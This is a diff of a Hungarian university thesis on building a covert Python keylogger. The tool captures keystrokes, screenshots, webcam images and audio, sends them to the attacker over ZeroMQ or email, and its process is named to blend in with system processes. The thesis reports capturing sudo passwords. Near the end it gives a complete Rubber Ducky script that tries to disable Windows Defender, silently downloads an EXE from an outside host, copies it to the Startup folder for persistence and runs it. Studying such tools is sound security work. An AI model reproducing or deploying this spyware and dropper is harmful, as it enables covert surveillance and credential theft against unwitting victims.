@@ -92,8 +92,8 @@
 \newcommand{\szerzo}{Felmeri Zsolt} % Szerző neve
 \newcommand{\temavezetoA}{Dr. Szántó Zoltán}
 
-\newcommand{\temavezetoAfokozat}{Egyetemi tan\'ar}% Első konzulens neve
-\newcommand{\temavezetoAfokozatRo}{Profesor universitar}
+\newcommand{\temavezetoAfokozat}{Adjunktus}% Egyetemi tan\'ar
+\newcommand{\temavezetoAfokozatRo}{Șef lucrări}% Profesor universitar
 \newcommand{\temavezetoAfokozatEn}{Lecturer} %Full Professor
 \newcommand{\temavezetoB}{} % Második konzulens neve; hagyd üresen, ha egy konzulensed van.
 \newcommand{\cimHu}{Keylogger} % Cím
@@ -109,6 +109,8 @@
 \include{titlepage}
 \include{titlepage-ro}
 \include{titlepage-en}
+
+%\include{table}
 
 \includepdf[pages={1}]{Declaratie.pdf}
 \include{abstract}
@@ -141,20 +143,29 @@ Az ellenintézkedések hatékonysága változó, mivel a keyloggerek különböz
 A következő fejezetben részletes bemutatásra kerülnek a keyloggerek tipusai és az ellenintézkedések formái.
 
 \section{Célkitűzés}
-%bullet formatum
 \begin{itemize}
 \item Tanulmányozni kell a pynput python modult, amely egy részben a billentyűzet eseményeit kezeli.
 \item Tanulmányozni kell a zmq python modult, amely kommunikációs kapcsolatot alakít ki két vagy több gép között.
 \item A támadó szemszögéből kell kivitelezni a dolgokat, például az alkalmazás ne tűnjön fel az áldozatnak, hogy fut a gépén.
-\item Ki kell dolgozni a támadó (Hacker) részére és a felhasználó (Target) részére egy-egy alkalmazást.
+\item Ki kell dolgozni a támadó (Hacker) részére és az áldozat (Target) részére egy-egy alkalmazást.
+\item Leütött billentyűk elfogása.
+\item Az áldozat felén a szoftver küldjön emailt a támadónak, ha a ZeroMQ protokoll kapcsolat megszakad.
+\item A támadó felén a szoftver fogadja az emaileket.
+\item Lehessen képernyőképet készíteni az áldozat számítógépén.
+\item Lehessen web kamera képet készíteni az áldozatról.
+\item Lehessen hangfelvételt készíteni.
+\item Az elküldött csomagok titkosítása.
+\item A titkosított csomagok tömörítése.
+\item Futtatható fájl készítése.
 \item Tesztelni az alkalmazást a három gyakori operációs rendszeren (Windows, Linux, MacOS)
-\item Futtatható fájl készítése
+\item Tesztelés virtuális gépeken.
+\item Tesztelés valós gépeken.
+\item Rubber Ducky skriptek megírása a gyakori operációs rendszerekre.
 \item Eljuttatni az alkalmazást a felhasználó (Target) gépére és futtatni azt a háttérben.
 \end{itemize}
 
 
 \chapter{Bibliográfiai tanulmány}\label{sec:bibl}
-%bevezetes, hogy mit probalunk korbejarni
 A fejezet tartalmazza a keyloggerek és a rosszindulatú szoftverek definícióit, és hogy ezek milyen módszerrel kerülhetnek az áldozat rendszerére. Később, a keyloggerek elleni védelem kerül leírásra.
 
 \section{Definíció}
@@ -214,21 +225,19 @@ Az utóbbi a rosszindulatú keyloggerekre erősen vonatkozik, mivel nincs egyedi
 Az aláírás alapú anti keyloggerek olyan alkalmazások \cite{tuli2013system}, amelyek a telepített fájlok vagy DLL-ek, valamint az általa készített beállításjegyzék alapján azonosítják a keyloggereket. Bár sikeresen azonosítja az ismert keyloggereket, nem tudja azonosítani azokat a keyloggereket, amelyeknek aláírása nincs tárolva az adatbázisban.A virusirtó szoftverek többsége ezen a megközelítésen alapuló eljárást alkalmazzák.
 
 \subsection{Horog alapú anti keylogger}
-A Windows rendszereken egy horog folyamat a $SetWindowsHookEx$ függvényt használja, ugyanazokat a funkciókat, mint a horog alapú keyloggerek \cite{tuli2013system}. Ezt arra használják, hogy figyelemmel kísérjék a rendszer bizonyos típusú eseményeit, például billentyűleütés vagy egérkattintás. Azonban a horog alapú anti keyloggerek blokkolják a vezérlés ezen átadását egyik horog eljárásról a másikra. Ennek eredményekét a keylogger szoftver nem generál naplózást a billentyűleütés elfogásakor. Bár a horog alapú anti keyloggerek jobbak mint az aláírás alapú anti keyloggerek, de ezek továbbra sem képesek megállítani minden keyloggert.
+A Windows rendszereken egy horog folyamat a $SetWindowsHookEx$ függvényt használja, ugyanazokat a funkciókat, mint a horog alapú keyloggerek \cite{tuli2013system}. Ezt arra használják, hogy figyelemmel kísérjék a rendszer bizonyos típusú eseményeit, például billentyűleütés vagy egérkattintás. Azonban a horog alapú anti keyloggerek blokkolják a vezérlés ezen átadását egyik horog eljárásról a másikra. Ennek eredményeként a keylogger szoftver nem naplózza a billentyűket a billentyűleütés elfogásakor. Bár a horog alapú anti keyloggerek jobbak mint az aláírás alapú anti keyloggerek, de ezek továbbra sem képesek megállítani minden keyloggert.
 
 
 \chapter{A rendszer specifikációi és architektúrája}\label{sec:specs_and_arch}
 
 \section{Felhasználói követelmények}
-%user needs
-%what the user does with the system | activities that users must be able to perform
-A keylogger, a fejlesztett alkalmazás, feltételezi, hogy valamilyen módon az áldozathoz kerül, aki használja. Miután az alkalmazás begyűjti az adatot, azt elküldi a támadónak. Ennek értelmében rendszernek két típusú felhasználója van: egy aktív és egy passzív. \ref{fig:specifickeylogger} ábra mutatja az általunk fejlesztett keylogger usecase diagramját.
 \begin{figure}[H]
 \centering
 \includegraphics[width=400pt]{../images/specific\ keylogger}
 \caption{A keylogger rendszer usecase diagramja}
 \label{fig:specifickeylogger}
 \end{figure}
+A keylogger, a fejlesztett alkalmazás, feltételezve van, hogy valamilyen módon az áldozathoz kerül, aki használja. Miután az alkalmazás begyűjti az adatot, azt elküldi a támadónak. Ennek értelmében rendszernek két típusú felhasználója van: egy aktív és egy passzív. \ref{fig:specifickeylogger} ábra mutatja az általunk fejlesztett keylogger usecase diagramját.
 
 A passzív felhasználó az ábrán levő áldozatot (Target) jelképezi. A szoftver az áldozat tudta nélkül kell fusson az operációs rendszeren, miközben az áldozat folyamatosan használja a számítógépét. Használat alatt karakterek bevitelét értjük a billentyűzeten keresztül. Az egér mozgása nem kerül monitorizálásra.
 
@@ -243,16 +252,12 @@ Ha a támadó úgy látja jónak, lehetősége adódik a kapcsolat felbontásár
 Az e-mail küldési folyamat csak addig működik, amíg az áldozat észre nem veszi, hogy egy általa nem kívánt szoftver fut a gépén, jelen esetben a keylogger, és azt szándékában áll leállítani. Ekkor leáll az adatgyűjtés és az adatok tövábbítása is.
 
 \section{Rendszer követelmények}
-%what the system “shall do.”
-%can my pc run it?
-
 \subsection{Funkcionális követelmények} %milyen inputra milyen output
 A Hacker szemszögéből három alkalmazást különíthetünk el: Target app, Hacker app és GUI. \ref{fig:startupdia} ábra szemlélteti a rendszer működési folyamatát.
 
 A Target app gépi kódra való lefordítása során figyelembe kell venni, hogy ez az alkalmazás a háttérben, feltűnés mentesen kell fusson. A futtatható fájlnak be lehet állítani az ikonját és a nevét is. Mivel minden futó program látható a folyamatok között az operációs rendszeren, ezért ha van egy ideális ikonja, és ha a neve megegyezik egy, az operácós rendszer által futtatott folyamat nevével, akkor kevésbé lesz feltűnő a Target számára, főleg ha ez el van rejtve valahol a folyamatok között. A taskmanagerben esetleg látható, de a felhasználók zöme nem követi ezt.
 
-A támadó gépén levő alkalmazás és az áldozat gépén levő alkalmazás kapcsolódása után, a támadónak igénye lehet használni a GUI-t és a parancssoron megjelenő menüt. Amint a kapcsolat létrejött a GUI automatikusan elindul, és valós időben adódnak hozzá az adatok.
-%rendszer moduljai kozotti interakciok
+A támadó gépén levő alkalmazás és az áldozat gépén levő alkalmazás kapcsolódása után, a támadónak igénye lehet használni a GUI-t és a parancssoron megjelenő menüt. Amint a kapcsolat létrejött a támadó és az áldozat felek között, a GUI automatikusan elindul, és valós időben adódnak hozzá az adatok.
 \begin{figure}[H]
 \centering
 \includegraphics[width=400pt]{../images/startup\ diagram}
@@ -264,11 +269,10 @@ A GUI segít a megszerzett adatok megjelenítésében, amelyek a Hacker számít
 
 A rendszerinformáció megtekintésében a felhasználónak szükséges rákattintania a $PC Information$ gombra. Ez által egy új ablak ugrik fel, ahol az adatok megjelenítésre kerülnek. Az adatok az elmentett fájlból kiolvasva kerülnek az ablak megjelenítő részébe. Ez az ablak bármikor előhívható vagy bezárható, amíg a GUI alkalmazás fut.
 
-A karaktereket egy másik elmentett állományból olvassa ki, és jeleníti meg egy legördülő listában, ha létezik ez az állomány, különben egy üres lista jelenik meg. A szavakat is meg lehet nézni, amelyek úgy épülnek fel, hogy a karakterek egy karakterláncba fűződnek amíg egy $ENTER$ (két ascii kód határozza meg CR/LF 10 + 13) vagy egy $SPACE$ (ascii kódja 13) elválasztó karakter nem következik. Például legyen egy karakterlánc: `p' `i' `r' `o' `s' `32' `a' `l' `m' `a' `13', a 32 jelenti a szóköz karaktert ascii kódját és addig osszeállítja a ``piros'' szót. A 13 jelenti az újsor karaktert ascii kódját, és addig felépíti az ``alma'' szót.
+A karaktereket egy másik elmentett állományból olvassa ki, és jeleníti meg egy legördülő listában, ha létezik ez az állomány, különben egy üres lista jelenik meg. A szavakat is meg lehet nézni, amelyek úgy épülnek fel, hogy a karakterek egy karakterláncba fűződnek amíg egy $ENTER$ (két ascii kód határozza meg CR/LF 10 + 13) vagy egy $SPACE$ (ascii kódja 13) elválasztó karakter nem következik. Például legyen egy karakterlánc: `p' `i' `r' `o' `s' `32' `a' `l' `m' `a' `13', a 32 jelenti a szóköz karakter ascii kódját és addig osszeállítja a ``piros'' szót. A 13 jelenti az újsor karakter ascii kódját, és addig felépíti az ``alma'' szót.
 
 A táblázat \ref{tab:karlanc} egy példát szemléltet a szavak felépítésére. Az első sor tartalmazza a bemenetet, és a fent leírtak alapján a második két sor (piros és alma) jelenti a kimenetet.
 \begin{table}[H]
-%\centering
 \caption{Példa szóépítésre}
 \label{tab:karlanc}
 \hspace{7em}
@@ -301,7 +305,7 @@ Mivel a GUI egy egyedül álló alkalmazás, ezért be lehet zárni, és nem bef
 A parancssoron (console vagy terminal) megjelenő menü arra szolgál, hogy a Hacker alkalmazás kérést küldjön a Target alakalmazás fele. A kérések a következők lehetnek: képernyőkép (screenshot), webkamerakép (webcam picture), hangfelvétel (audio recording) és kapcsolat bezárás. A kérés közben megjelenik, a folyamat ütemezési információja. Például, ha egy képernyőképet kér a Hacker, akkor megjelenik a folyamat kezdéséhez járuló szöveg, és a befejezésénél a végéhez járuló szöveg, hogy követhető legyen az adatátvitel, lásd ábra \ref{fig:logging}. A menüpontokat számok formátumban kell megadni a parancssoron:
 \begin{itemize}
 \item 1 = screenshot
-\item 2 = webcam picure
+\item 2 = webcam picture
 \item 3 = audio recording
 \item 4 = connection closure
 \end{itemize}
@@ -372,7 +376,7 @@ A \emph{getpass}, \emph{os}, \emph{sys}, \emph{shutil} és \emph{platform} modul
 
 A \emph{threading} modul segítségével új, párhuzamos szálakat hoszhatunk létre. Ez segít több feladat elvégzésében egymást nem blokkolva.
 
-A \emph{datetime} modullal le lehet kérni az aktuális időt, olyan formátumban amilyenben a használó szeretné. %https://www.programiz.com/python-programming/datetime/strftime
+A \emph{datetime} modullal le lehet kérni az aktuális időt, olyan formátumban amilyenben a használó szeretné.
 
 Az \emph{smtplib}, \emph{imaplib} és \emph{email} modulok segítsígével lehet kapcsolódni a gmail szolgáltatóhoz üzenet küldés vagy fogadás céljából. Az \emph{imaplib} modullal lehet kapcsolatot teremteni olvasásra, míg az \emph{smtplib} modullal írásra, azaz küldésre. Az \emph{email} modul tartalmazza azokat az osztályokat, amelyek szükségesek egy email objektum létrehozásában és kódolásában.
 
@@ -425,20 +429,20 @@ A CommunicationHacker osztály megvalósít két kapcsolatot a ZeroMQ protokollt
 
 A REQ | REP egy kétoldali kommunikáció, mert a Hacker oldal küld kéréseket a Target oldal fele, és a Target oldal elvégzi a kért műveleteket és az eredményt elküldi a Hacker oldalnak. Ezen a kommunikáción van megvalósítva a Hacker oldali és a Target oldali menü kezelése.
 
-A háttérben a ZeroMQ protokoll TCP kapcsolatot hoz létre, de nem kell foglalkozni a csomagkezeléssel.
+A háttérben a ZeroMQ protokoll TCP kapcsolatot hoz létre, de nem kell foglalkozni a csomagkezeléssel. A lenti ábrákon az általános kapcsolatok vannak ábrázolva.
 
 A publisher feladata az üzenetek küldése témákon belül. Az üzeneteket csak azok kapják meg, akik feliratkoztak a bizonyos témára, lásd ábra \ref{fig:pubsub}
 \begin{figure}[H]
 \centering
 \includegraphics{../images/pubsubrel}
-\caption{Publisher subscriber kapcsolat}
+\caption{ Egy publisher több subscriber kapcsolat}
 \label{fig:pubsub}
 \end{figure}
-A mi esetünkben a publisher szerepét a Target játsza és a subscriber a Hacker. Meg lehet oldani a több Target és egy Hacker kapcsolatát, ezért olyan ábrát kellene elképzelni, amelyen több publisher és egy subscriber van. Az ábra \ref{fig:pubsub2} szemlélteti az általunk használt folyamatot:
+A mi esetünkben a publisher szerepét a Target játsza és a subscriber a Hacker. Meg lehet oldani a több Target és egy Hacker kapcsolatát, ezért olyan ábrát kellene elképzelni, amelyen több publisher és egy subscriber van. Az ábra \ref{fig:pubsub2} hasonlít az általunk használt folyamatra:
 \begin{figure}[H]
 \centering
 \includegraphics{../images/pubsubrel2}
-\caption{Az általunk használt publisher subscriber kapcsolat}
+\caption{Több publisher egy subscriber kapcsolat}
 \label{fig:pubsub2}
 \end{figure}
 
@@ -558,10 +562,21 @@ elif data[0] == 'audio':
 			self.logger.info('Done')
 \end{lstlisting}
 
+\subsection{Bináris állomány generálása python kódból}
+A futtatható fájlt, vagy bináris állományt a Python \textit{pyinstaller} moduljával lehet elkészíteni. Ez persze személyes választás, mivel nem csak ez az egy modul van erre a célra tervezve a Python nyelvben (ilyen modul például a \textit{py2exe} is). Azért lett a pyinstaller modul választva, mert támogatja a Windows, a Linux és a Mac rendszereket it, míg a py2exe csak a Windows rendszerekhez használható. A modul 4.1 verzióját érdemes használni, mivel vannak más modulok is, amelyeknek nem a legújabb verzióját használjuk (pynput, zmq) a kompatibilitás szempontjából.
+
+Megnyitunk egy cmd vagy PowerShell-t Windows-on, terminált Linux-on vagy Mac-en és a következő parancsot használjuk:
+\begin{lstlisting}{language=PowerShell}
+pyinstaller --onefile --name ``nev'' --icon ``icon path'' TargetApp.pyw
+\end{lstlisting}
+
+A \textit{onefile} opció összesűríti egy állományba az összes állományt, így nem szükséges a futtatható állomány mellé elküldeni azokat a fájlokat amellyekre szüksége lenne. A \textit{name} opcióval megadhatjuk a bináris állomány nevét, és az \textit{icon} opcióval egy ikont is adhatunk neki. Legvégül megadjuk azt a python állományt, amelyik elindítja a szoftvert.
+
 \section{Target oldal}\label{subsec:client}
 A Target oldal is három osztályt tartalmaz, mint a Hacker oldal, ha nem vesszük számításba a GUI-t, mert a GUI egy különálló alkalmazás, csak a Hacker oldal fogja aktíválni, lásd ábra \ref{fig:clientclassdia}.
 
 Előszőr, meg kell nézni, hogy milyen rendszeren van futtatva. Ez után létre van hozva a $CommunicationTarget$ osztály, amelynek négy attribútumja van: egy ip cím, két port (egy a PUB SUB kapcsolatnak és egy a REQ REP kapcsolatnak) és a ZeroMQ által létrehozott kontextus. Példányosításkor a Hacker publikus ip címét kell megadni.
+
 \begin{figure}[H]
 \centering
 \includegraphics[width=400pt]{../images/targetclassdiagram}
@@ -793,21 +808,21 @@ def record_audio(save_path):
 \end{lstlisting}
 A hangrögzítés egy kicsivel másképp kezelendő, mert meg kell mondani, hogy egy részt hány bájton abrázoljon (1024), milyen formátumba ábrázolja (16 bit int), hány csatornán (2) ábrázolja a hanghullámokat, mekkora frekvencián (44.1 kHz) és hány másodperces felvételt akarunk elmenteni (10). Ezek a függvények egy úgynevezett $utils.py$ mellékállományban vannak implementálva, amely említésre kerül a komponensek bemutatásánál.
 
-%\chapter{A rendszer felhasználása}\label{sec:useage}
-
 \chapter{Kísérleti eredmények}\label{sec:testcases}
-% le kell irni a mero berendezest
-% kiserlet nr 1 VMs
-% kiserlet nr 2 valos gepek
-%--------------------
-% stress testing | mennyit tud athozni
+A szoftver teszteléséhez létrehoztunk egy-egy viruális gépet a gyakori operációs rendszerekről, és valós gépeken is teszteltük. A virtuális gépek létrehozásához a VMware Workstation szoftvert használtuk, lásd ábra \ref{fig:VMware1}
+\begin{figure}[H]
+\centering
+\includegraphics[width=400pt]{../images/VMware1}
+\caption{VMware Workstation}
+\label{fig:VMware1}
+\end{figure}
 
-A szoftver teszteléséhez létrehoztunk egy-egy viruális gépet a gyakori operációs rendszerekről, és valós gépeken is teszteltük. A virtuális gépek létrehozásához a VMware Workstation szoftvert használtuk.
-
-\section{Viruális gépeken való kísérlet}
-Három virtuális gépet kellett létrehozni, és telepíteni a Windows, Linux és Mac operációs rendszereket. Ezeken a gépeken telepítve volt a python 3.X és a szükséges csomagok a tesztelés kivitelezéséhez. A rendszer elindítása után csatlakoztatjuk a USB Rubber Ducky-t, amely letölti a futtatható (EXE vagy ELF) fájlt a rendszerre.
+\section{Virtuális gépeken való kísérlet}
+Három virtuális gépet kellett létrehozni, és telepíteni a Windows, Linux és Mac operációs rendszereket. Ezekre a gépekre telepítettük a python 3.X verzióját és a szükséges csomagok a tesztelés kivitelezéséhez. A rendszer elindítása után csatlakoztatjuk a USB Rubber Ducky-t, amely letölti a futtatható (EXE vagy ELF) fájlt a rendszerre.
 
 Az EXE a Windows rendszerekre jellemző futtatható fájlok. Az ELF pedig a UNIX rendszerekre jellemző, mivel az EXE egy fájl kiterjesztése (például: keylogger.exe), UNIX redszereken a fájl kiterjesztése elhanyagolható (például: keylogger).
+
+A hálózat kialakítása az első fázisban alacsony szintű TCP kapcsolt volt. Mivel nagyobb méretű adat érkezett (például kép), mint egy karakter, ezért a virtuális gépeken nem küldte át. A második fázisban áttértünk a ZeroMQ protokoll használatára és ez megoldotta a problémát.
 
 A következő alfejezetek a különböző operációs rendszereken mért eredményeket mutatják be.
 
@@ -819,7 +834,7 @@ Két felhasználót készítettünk, egy az alapértelmezett, amelyik adminisztr
 Steve felhasználót használva, ha be szeretnénk lépni John felhasználó mappájába, akkor felugrik egy ablak, amely kéri az admin jelszavát, lásd ábra \ref{fig:winVM1}. Ebben a helyzetben az  általunk fejlesztett keylogger nem képes elfogni a lenyomott billentyűket. Bármely más helyzetben sikeresen elfogja a lenyomott billyentyűket.
 \begin{figure}[H]
 \centering
-\includegraphics{../images/windowsVM1}
+\includegraphics[width=400pt, height=300pt]{../images/windowsVM1}
 \caption{Jogosultságkezelő ablak}
 \label{fig:winVM1}
 \end{figure}
@@ -827,7 +842,7 @@ Steve felhasználót használva, ha be szeretnénk lépni John felhasználó map
 \subsection{Linux rendszer (VM)}
 A rendszer specifikációi: 16 processzor (processzorok száma: 4, mag/processzor: 4), 8 GB memória, 200 GB merevlemez tárhely, 64 bites arhitektúra, Kali Linux KDE.
 
-Létrehoztunk egy felhasználót (John) adminisztrátor jogosultsággal. Észrevettük, hogy a szoftver elfogja a jelszó mezőbe írt karaktereket is. A következő ábrák \ref{fig:linuxVM2} és \ref{fig:linuxVM1} szemléltetik ezt.
+Létrehoztunk egy felhasználót (John) adminisztrátor jogosultsággal. John felhasználóval meg szeretnénk nézni, hogy milyen parancsokat futtathatunk admin jogosultsággal. Ezt a \textit{sudo -l} paraccsal nézhetjük meg.  Ehhez szükséges megadni a felhasználó (John) jelszavát. Észrevettük, hogy a szoftver elfogja a jelszó mezőbe írt karaktereket is.  Az ábra \ref{fig:linuxVM1} mutatja, hogy a pirossal bekeretezett részen John felhasználó jelszava található, amit az ábra \ref{fig:linuxVM2} jelszó mezőjébe beírtunk (jelszó mező: [sudo] password for john:). Teszteléshez a Z shell-t (zsh) használtuk, amely egy kiterjesztett Bourne shell (bash) sok újítással.
 \begin{figure}[H]
 \centering
 \includegraphics[width=450pt]{../images/linuxVM2}
@@ -841,15 +856,13 @@ Létrehoztunk egy felhasználót (John) adminisztrátor jogosultsággal. Észrev
 \label{fig:linuxVM1}
 \end{figure}
 
-A \textit{sudo -l} paracsot alkalmazva megnézhetjük, hogy milyen parancsokat futtathatunk \textit{sudo}, vagy adminisztrátor joggal. Ehhez szükséges megadni a felhasználó (John) jelszavát. Az ábra \ref{fig:linuxVM1} mutatja, hogy a pirossal bekeretezett részen John felhasználó jelszava található, amit az ábra \ref{fig:linuxVM2} jelszó mezőjébe beírtunk (jelszó mező: [sudo] password for john:).
-
 \subsection{Mac rendszer (VM)}
 A rendszer specifikációi: 2 processzor (processzorok száma: 1, mag/processzor: 2), 8 GB memória, 100 GB merevlemez tárhely, 64 bites arhitektúra, MacOS Catalina 10.15.5.
 
 Az operációs rendszer telepítésekor létrehoztunk egy felhasználót (John), akinek adminisztrátor jogosultsága van. A szoftver elindításakor (ha terminálból indítjuk el) felugrik egy ablak, amely kérvényezi a billentyűzet monitorizálásához az engedélyt, lásd ábra \ref{fig:macVM1}. Így csak akkor működik a szoftver miután a felhasználó engedélyezte, ha nincs alapból engedélyezve. Ez a helyzet fentáll akkor is, ha kameraképet szeretnénk készíteni, és esetekben a képernyőképnél is.
 \begin{figure}[H]
 \centering
-\includegraphics[width=400pt]{../images/macVM1}
+\includegraphics[width=450pt, height=105pt]{../images/macVM1}
 \caption{Engedélyező ablak MAC rendszeren}
 \label{fig:macVM1}
 \end{figure}
@@ -857,17 +870,129 @@ Az operációs rendszer telepítésekor létrehoztunk egy felhasználót (John),
 Feltételezzük, hogy az engedély a billentyűzet monitorizálásához megvan, így el tudjuk fogni a leütött billentyűket. Ebben az esetben is, mint a Windows rendszer esetében, ha admininisztrátor jogosultság kell egy feladat elvégzéséhez, akkor azt a jelszót nem tudjuk elfogni. Az ábra \ref{fig:macVM2} szemlélteti, hogy a megadott jelszót nem tudjuk elfogni.
 \begin{figure}[H]
 \centering
-\includegraphics[width=400pt]{../images/macVM2}
+\includegraphics[width=450pt]{../images/macVM2}
 \caption{Terminálon végzett feladat John felhasználóval}
 \label{fig:macVM2}
 \end{figure}
 
+A \textit{sudo -l} paranccsal meg szeretnénk nézni, hogy John felhasználó milyen parancsokat futtathat admin jogosultsággal. Tesztelésre a Z shell-t (zsh) alkalmaztuk, mint a Linux operációs rendszer esetében.
+
+Azt vettük észre ebben a helyzetben, hogy a készített képernyőkép nem tartalmazza a megnyitott ablakokat csak a hátteret.
+
 \section{Valós gépeken való kísérlet}
 Valós gépek alatt a saját laptopomat és asztali gépemet használtam tesztelésre, Windows és Linux operációs rendszereken. Mac operációs rendszer alatti tesztelésben egyik rokonom segített ki egy Apple laptoppal.
 
-A tesztek eredményei teljesen megeggyeztek a virtuális gépeken való tesztek eredményeivel. Ebben az esetben is a bejelentkezési jelszavak elfogására törekedtem. Windows és Mac rendszereken nem tudtam a jelszavakat begyűjteni, míg Linux rendszeren ez sikeres volt. A virtuális gépeken levő operációs rendszerek és a valós gépeken levő operációs rendszerek verziója között nem volt nagy eltérés. A kicsi eltérés alatt azt értem, hogy az operációs rendszerek megeggyeznek csak egyes helyeken frissített verzión teszteltem és máshol peding régebbi verzión.
+A tesztek eredményei teljesen megeggyeztek a virtuális gépeken való tesztek eredményeivel. Ebben az esetben is a bejelentkezési jelszavak elfogására törekedtem. Windows és Mac rendszereken nem tudtam a jelszavakat begyűjteni, míg Linux rendszeren ez sikeres volt. A virtuális gépeken levő operációs rendszerek és a valós gépeken levő operációs rendszerek verziója között nem volt nagy eltérés. A kicsi eltérés alatt azt értem, hogy az operációs rendszerek megeggyeztek, csak egyes helyeken frissített verzión teszteltem és máshol peding régebbi verzión.
 
-\chapter{Következtetések}\label{sec:conc}
+A következö alfejezetek tartalmazzák a Windows és Linux rendszereken való teszttelést. Mac rendszerre nem volt lehetőségem képeket hozni, mivel nincs birtokomban Apple gép.
+
+\subsection{Windows rendszer}
+Windows rendszeren az asztali számítógépemet használtam a Hacker oldalnak és a laptopomat a Target oldalnak. Előszőr a Hacker el kell indítson egy szervert, ahonnan a Target gépére kerül a futtatható kód. A szervert egy python modul segítségével indítjuk el és kiválasztjuk a 777 portot. A modul neve \textit{updog}. Ezt a modult a python http.server moduljával implementálták. Az ábra \ref{fig:winPC1} mutatja a szerver elindítását.
+\begin{figure}[H]
+\centering
+\includegraphics[width=450pt]{../images/windowsPC1}
+\caption{A szerver elindítása}
+\label{fig:winPC1}
+\end{figure}
+
+A szerverrel egyszerre elindítjuk a Hacker oldalon a szoftverünket. Az ábra \ref{fig:winPC4} mutatja a szoftver elindítását.
+\begin{figure}[H]
+\centering
+\includegraphics[width=450pt]{../images/windowsPC4}
+\caption{A keylogger elindítása a Hacker oldalon}
+\label{fig:winPC4}
+\end{figure}
+
+Ha a szerver elindult, akkor a Target gépére letöltjük az EXE fájlt, és elindítjuk. A letöltést az ábra \ref{fig:winPC2} mutatja, és azt, hogy fut a rendszeren az ábra \ref{fig:winPC3} mutatja.
+\begin{figure}[H]
+\centering
+\includegraphics[width=450pt]{../images/windowsPC2}
+\caption{Exe fájl letöltése a Target gépén}
+\label{fig:winPC2}
+\end{figure}
+\begin{figure}[H]
+\centering
+\includegraphics[width=450pt]{../images/windowsPC3}
+\caption{A feladat kezelő ablak tartalma}
+\label{fig:winPC3}
+\end{figure}
+
+Amint elindult az áldozat gépén a keylogger, a Hacker oldalon egy kis idő után létrejön a kapcsolat. Az ábra \ref{fig:winPC5} mutatja a Hacker oldalon a keylogger menüjét, míg az ábra \ref{fig:winPC6} ábrázolja a GUI-t.
+\begin{figure}[H]
+\centering
+\includegraphics[width=450pt]{../images/windowsPC5}
+\caption{Keylogger menüje}
+\label{fig:winPC5}
+\end{figure}
+\begin{figure}[H]
+\centering
+\includegraphics[width=400pt]{../images/windowsPC6}
+\caption{GUI ablak}
+\label{fig:winPC6}
+\end{figure}
+
+A GUI ablakban az előzőleg tesztelt adatok látszanak, amelyek felgyültek a fejlesztés során. Ettől a ponttól teljesen működőképes a keylogger. A menüt alkalmazva lehet képernyőképet, ebkameraképet és hangfelvételt készíteni. Ha a Hacker úgy látja jónak, akár be meg is szüntetheti a kapcsolatot a Targettel, így emailen keresztül fogja megkapni az adatokat.
+
+\subsection{Linux rendszer}
+A Linux rendszeren való tesztelés során hasonló az eljárás, mint a Windows rendszeren való tesztelés során. Előszőr elindítjuk a szervert a Hacker oldalon és letöltjük a futtatható állományt a Target oldalon. Ez után elindítjuk a Hacker oldalon a szoftvert, és várjuk, hogy elinduljon a Target oldalon a keylogger. Az ábra \ref{fig:linuxPC1} mutatja az elindult keyloggert, amelynek azt a nevet adtuk, hogy \textit{UpdateLinux}. Így kevésbé feltűnő az, hogy egy nem kívánt alkalmazás fut a Target rendszerén.
+\begin{figure}[H]
+\centering
+\includegraphics[width=450pt]{../images/linuxPC1}
+\caption{Listázott folyamatok Linux rendszeren}
+\label{fig:linuxPC1}
+\end{figure}
+
+A keylogger elvégzi a feladatát, tehát képes a lenyomott billentyűket elfogni, képernyőképet készíteni, webkameraképet készíteni, hangfelvételt készíteni és emailt küldeni, ha a ZeroMQ kapcsolat megszakadt.
+
+A lenyomott billentyűk elfogása során azt is észrevettük, hogy az adminisztrátor jogosultsággal levő felhasználók jelszavát el lehet fogni, ha olyan aktivitást folyatnak, amely ifényli a felhasználó jelszavát (például a korábban említett \textit{sudo -l} parancs végrehajtása). Megjegyzés: ebben az esetben nem szolgálhatok képekkel, mert megjelenne az aktuális jelszavam.
+
+\subsection{Ducky szkript}
+A Rubber Ducky szkript generálásához létezik egy weboldal, amelyen a megírt kódból bináris állomány készül: https://ducktoolkit.com/encode. Ezt az oldalt használva a \textit{Ducky Code} részlet alatt megírjuk az alábbi kódot:
+\begin{lstlisting}{language=PowerShell}
+REM Disable Windows Defender with PowerShell
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell saps powershell -A 'Set-MpPreferences -DisableRea $true' -V runAs
+ENTER
+DELAY 200
+LEFTARROW
+ENTER
+REM Download the keylogger
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell saps powershell
+ENTER
+DELAY 200
+ALT y
+STRING powershell -windowstyle hidden {iwr 'http://keylogger.3utilities.com:777/CTF Loader2.exe' -o 'CTF Loader2.exe';cp 'CTF Loader2.exe' 'Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup';saps '.\CTF Loader2.exe'}
+ENTER
+\end{lstlisting}
+A fenti kód gyakorlatilag a billentyűzet billentyűkombinációit és a billentyűzettel való műveleteket írja le. Ez a kód Windows rendszerre készült. A UNIX rendszereken más billentyűkombinációkat és parancsokat kell megadni (például a ``GUI r'' helyett ``GUI space'' kell).
+
+A keylogger letöltése előtt megpróbáljuk kikapcsolni a Windows Defender-t. Ezt követően letöltődik a keylogger, és elindul a rendszeren. De mielőtt elindulna a keylogger, bemásolódik a \textit{Startup} mappába, azért, hogy a számítógép ujraindítása során automatikusan elinduljon a szoftver.
+
+A kód megírása utan rákattintunk az \textit{Encode Payload} gombra, amely megjelenít újabb két gombot, ha elfogadjuk a feltételeket. Ezek után rákattintunk \ a \textit{Download Inject.bin} gombra, amely letölti a bináris állományt. Ezt az állományt fel kell rakni a USB Rubber Ducky-ra. Megjegyzés képpen, a \textit{Language} rész alatt ki lehet választani a billentyűzet beállítását.
+
+\section{Az opciókból álló adatátvitel a ZeroMQ segítségével}
+Az opciókból álló adatokra ebben a helyzetben a képernyőképre, a webkameraképre és a hangfelvételre gondolok. Ezek az adatok a ZeroMQ protokol segítségével küldődnek el a hálózaton.
+
+A ZeroMQ mint könyvtár bizonyos hálózati kommunikációs minták követésével, aszinkron módon működik. A ZeroMQ kommunikáció üzenetorientált. Ez azt jelenti, hogy ha egy kliens 150KB méretű üzenetet küld, akkor a szerver egy teljes és azonos üzenetet fog kapni anélkül, hogy pufferelést vagy keretezést kellene végrehajtania. Az elküldött üzenetek nagysága nincs korlátozva, azonban a kis üzeneteket másként kezelik, mint a nagy üzeneteket. A kis üzenetek a verem (stack) memóriaterületre lesznek elhelyezve, míg a nagy üzenetek a halom (heap) memóriaterületre.
+
